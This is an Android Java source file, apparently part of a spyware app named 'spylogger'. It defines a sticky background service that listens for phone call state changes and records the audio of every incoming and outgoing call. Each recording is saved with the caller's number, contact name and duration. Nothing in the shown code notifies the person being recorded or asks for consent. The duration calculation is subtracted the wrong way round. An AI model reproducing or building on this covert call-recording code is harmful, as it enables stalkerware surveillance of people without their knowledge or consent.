package com.gravatasufoca.spylogger.services;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaRecorder;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.gmailsender.Utils;
import com.gravatasufoca.spylogger.model.Gravacao;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;
import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioGravacaoImpl;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
import com.utilidades.gravata.utils.Utilidades;

import java.io.File;
import java.io.IOException;
import java.sql.SQLException;
import java.util.Date;

public class RecordService extends Service{
	private MediaRecorder recorder;
	private File callFile;
	private boolean remetente;
	private RepositorioGravacao repositorioGravacao;
	private RepositorioTopico repositorioTopico;
	private static boolean recording = false;
	private static MyPhoneStateListener phoneListener;
	private String INCOMING_CALL_ACTION = "android.intent.action.PHONE_STATE";
	private String OUTGOING_CALL_ACTION = "android.intent.action.NEW_OUTGOING_CALL";
	private String phoneNumber;
	private Date inicio;

	private final IBinder mBinder = new LocalBinder();

	public class LocalBinder extends Binder {
		RecordService getService() {
			return RecordService.this;
		}
	}

	private BroadcastReceiver callReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {

			if(phoneListener==null){
				phoneListener = new MyPhoneStateListener(intent);

				TelephonyManager telephony = (TelephonyManager) context
						.getSystemService(Context.TELEPHONY_SERVICE);
				telephony.listen(phoneListener,
						PhoneStateListener.LISTEN_CALL_STATE);
			}else{
				phoneListener.setIntent(intent);
			}

			if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction())) {
				 setPhoneNumber(intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER));
		 	}
		}

	};

	class MyPhoneStateListener extends PhoneStateListener {

		private Intent intent;

		MyPhoneStateListener(Intent intent) {
			super();
			this.intent=intent;
		}
		public void setIntent(Intent intent) {
			this.intent = intent;
		}
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {

			if(state == TelephonyManager.CALL_STATE_IDLE){
				// DESLIGUEI
				Log.d("DEBUG", "IDLE");

				if (recording) {
					stopRecording();
					long secondsBetween =  ((inicio.getTime() - (new Date()).getTime()) / 1000);
					try {
						Thread.sleep(1000);
					} catch (InterruptedException e) {
					}

					try {

						repositorioGravacao = new RepositorioGravacaoImpl(getApplicationContext());
						repositorioTopico=new RepositorioTopicoImpl(getApplicationContext());


						Gravacao gravacao=new Gravacao();
						gravacao.setRemetente(remetente);
						gravacao.setData(new Date());
						gravacao.setAudio(Utils.getBytes(callFile));
						gravacao.setNumero(phoneNumber);
						gravacao.setNome(com.gravatasufoca.spylogger.utils.Utils.getContactDisplayNameByNumber(phoneNumber,getApplicationContext().getContentResolver()));
						gravacao.setDuracao(secondsBetween);

						Topico topico = repositorioTopico.findByName(gravacao.getNome());
						if (topico == null) {
							topico = new Topico.TopicoBuilder()
									.setNome(gravacao.getNome())
									.setIdReferencia(gravacao.getNumero())
									.build();

							repositorioTopico.inserir(topico);
						}
						gravacao.setTopico(topico);
						repositorioGravacao.inserir(gravacao);
					} catch (IOException e) {
						e.printStackTrace();
					} catch (SQLException e) {
						e.printStackTrace();
					}


				}

			}else{
				if(!recording){
					if(state == TelephonyManager.CALL_STATE_OFFHOOK){
						// ESTOU LIGANDO
						Log.d("DEBUG", "OFFHOOK");
						setRemetente(true);
						/*if (Intent.ACTION_NEW_OUTGOING_CALL.equals(this.intent.getAction())) {
							setPhoneNumber(this.intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER));
					 	}*/
					}else{
						// RECEBI
						Log.d("DEBUG", "RINGING");
						setPhoneNumber(incomingNumber);
						setRemetente(false);
					}

//					if(!Utils.isInBlackList(context, phoneNumber))
						startRecording();
				}
			}
		}
	}


	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();

		IntentFilter intentToReceiveFilter = new IntentFilter();
		intentToReceiveFilter.addAction(INCOMING_CALL_ACTION);
		intentToReceiveFilter.addAction(OUTGOING_CALL_ACTION);
		this.registerReceiver(callReceiver, intentToReceiveFilter);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		//super.onStart(intent, startId);

		Utilidades.verifyPremium(this);
		return START_STICKY;
	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return mBinder;
	}


	void startRecording() {
		try {
			callFile = File.createTempFile("record", ".mp4", getCacheDir());
		} catch (Exception e) {
			e.printStackTrace();
		}

		recorder=new MediaRecorder();

		recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
		recorder.setOutputFile(callFile.getAbsolutePath());

		if(!Utilidades.isPremium(getApplicationContext())){
			recorder.setMaxDuration(30000);
		}

		try {
			recorder.prepare();
		} catch (IOException e) {
		}

		try{
			recorder.start();
		}catch(Exception e){
			recorder=new MediaRecorder();

			recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
			recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
			recorder.setOutputFile(callFile.getAbsolutePath());

			if(!Utilidades.isPremium(getApplicationContext())){
				recorder.setMaxDuration(30000);
			}

			try {
				recorder.prepare();
			} catch (IOException e1) {
				e.printStackTrace();
			}

			recorder.start();
		}
		inicio=new Date();
		recording = true;
	}

	void stopRecording() {
		if(recorder!=null){
			// Then clean up with when it hangs up:
			recorder.stop();
			recorder.release();
			recorder=null;
		}
		recording = false;
	}

	public void setPhoneNumber(String phoneNumber) {
		this.phoneNumber = phoneNumber;
	}

	public void setRemetente(boolean remetente) {
		this.remetente = remetente;
	}
}
